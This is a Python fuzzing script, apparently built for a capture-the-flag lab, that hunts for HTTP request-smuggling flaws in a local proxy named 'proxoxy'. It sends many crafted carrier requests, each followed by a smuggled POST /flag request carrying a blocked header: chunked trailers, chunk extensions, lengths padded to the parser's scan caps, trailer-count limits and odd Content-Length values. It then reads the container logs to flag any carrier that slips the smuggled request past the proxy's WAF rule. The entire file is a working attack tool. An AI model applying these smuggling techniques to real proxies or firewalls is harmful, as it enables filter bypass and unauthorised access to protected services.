#!/usr/bin/env python3
"""
mergefuzz - detect a proxoxy MESSAGE-MERGE.

Oracle: send <carrier request><smuggled POST /flag with brevski: george> through
proxoxy (48888) to the raw byte dumper.  If proxoxy frames them as TWO messages,
the smuggled one hits rule 2 and is DROPPED, so its bytes never reach the
backend.  If proxoxy frames them as ONE message (metadata = the carrier), the
rule engine never sees the brevski line and ALL bytes are forwarded.

So: token present in the dumper log  ==  merge  ==  full WAF bypass.

Control per candidate: the same bytes with `brevski: zzz`.  zzz must always be
forwarded; if it's not, the candidate was a parse error, not a rule hit, and
the row carries no information.
"""
import socket, subprocess, sys, time, itertools

PROXY = ("127.0.0.1", 48888)
CONT = "mccrab3r"


def smug(tok, val):
    return (b"POST /flag" + tok.encode() + b" HTTP/1.1\r\n"
            b"Host: h\r\n"
            b"brevski: " + val.encode() + b"\r\n"
            b"Content-Length: 0\r\n\r\n")


def send(payload, wait=0.6):
    s = socket.create_connection(PROXY, timeout=4)
    try:
        s.sendall(payload)
        time.sleep(wait)
        s.shutdown(socket.SHUT_WR)
        out = b""
        s.settimeout(1.0)
        try:
            while True:
                d = s.recv(65536)
                if not d:
                    break
                out += d
        except Exception:
            pass
        return out
    finally:
        s.close()


def logs(since):
    p = subprocess.run(["docker", "logs", CONT, "--since", since],
                       capture_output=True)
    return p.stdout + p.stderr


HEAD = (b"POST /health HTTP/1.1\r\nHost: h\r\n")


def carriers():
    """(name, carrier_bytes) - carrier must be a COMPLETE request for gunicorn's
    view to matter later; here we only need proxoxy's framing."""
    C = []
    te = HEAD + b"Transfer-Encoding: chunked\r\n\r\n"
    # --- baseline
    C.append(("te.plain", te + b"0\r\n\r\n"))
    # --- trailer-section shapes
    C.append(("te.trailer1", te + b"0\r\nX: a\r\n\r\n"))
    C.append(("te.trailer.crlf.only", te + b"0\r\n\r\n\r\n"))
    C.append(("te.chunk+0", te + b"4\r\nAAAA\r\n0\r\n\r\n"))
    # --- chunk-size-line variants (advance vs parse_chunked_body)
    for ext in (b"0;a=b", b"0;", b"0;a", b"0 ;a", b"00", b"000000",
                b"0;a=\"b\"", b"0;a=b;c=d"):
        C.append(("size." + ext.decode("latin-1"), te + ext + b"\r\n\r\n"))
    # --- chunk-size line right at proxoxy's 0x2000 scan cap
    for n in (8188, 8189, 8190, 8191, 8192, 8193):
        C.append(("sizepad.%d" % n, te + b"0;" + b"a" * n + b"\r\n\r\n"))
    # --- trailer line lengths around caps
    for n in (8189, 8190, 8191, 8192):
        C.append(("trlen.%d" % n, te + b"0\r\nX: " + b"a" * n + b"\r\n\r\n"))
    # --- many trailer lines (proxoxy's fresh HeaderBlock counter caps at 128)
    for n in (99, 100, 126, 127, 128, 129):
        tr = b"".join(b"X%d: a\r\n" % i for i in range(n))
        C.append(("trcount.%d" % n, te + b"0\r\n" + tr + b"\r\n"))
    # --- content-length carriers
    for n in (0, 1):
        C.append(("cl.%d" % n, HEAD + b"Content-Length: %d\r\n\r\n" % n + b"A" * n))
    # --- CL value shapes
    for v in (b"0", b"00", b"0 ", b" 0", b"\t0"):
        C.append(("clv." + v.decode("latin-1").strip() or "clv.pad",
                  HEAD + b"Content-Length:" + v + b"\r\n\r\n"))
    # --- last chunk with extension + trailer
    C.append(("te.0ext.trailer", te + b"0;x=y\r\nX: a\r\n\r\n"))
    # --- two terminal chunks
    C.append(("te.00", te + b"0\r\n\r\n0\r\n\r\n"))
    # --- chunk data containing a full CRLFCRLF
    inner = b"POST /x HTTP/1.1\r\nHost: h\r\n\r\n"
    C.append(("te.datahead", te + ("%x" % len(inner)).encode() + b"\r\n" + inner
              + b"\r\n0\r\n\r\n"))
    return C


def run():
    rows = []
    cands = carriers()
    print("candidates: %d" % len(cands))
    for i, (name, carrier) in enumerate(cands):
        res = {}
        for val in ("george", "zzz"):
            tok = "T%03d%s" % (i, "G" if val == "george" else "Z")
            t0 = time.time()
            since = time.strftime("%Y-%m-%dT%H:%M:%S",
                                  time.gmtime(t0 - 2)) + "Z"
            try:
                resp = send(carrier + smug(tok, val))
            except Exception as e:
                res[val] = ("SENDERR:%r" % e, False)
                continue
            time.sleep(0.25)
            lg = logs(since)
            res[val] = (len(resp), tok.encode() in lg)
        g, z = res["george"], res["zzz"]
        verdict = ""
        if not z[1]:
            verdict = "NOINFO(parse-error or carrier rejected)"
        elif g[1]:
            verdict = "*** MERGE - BYPASS ***"
        else:
            verdict = "split (rule saw it)"
        print("%-24s zzz_fwd=%-5s george_fwd=%-5s resp(g)=%-6s  %s"
              % (name, z[1], g[1], g[0], verdict))
        sys.stdout.flush()
        rows.append((name, z[1], g[1], verdict))
    print()
    wins = [r for r in rows if "MERGE" in r[3]]
    print("MERGES: %d" % len(wins))
    for w in wins:
        print("  ", w)


if __name__ == "__main__":
    run()
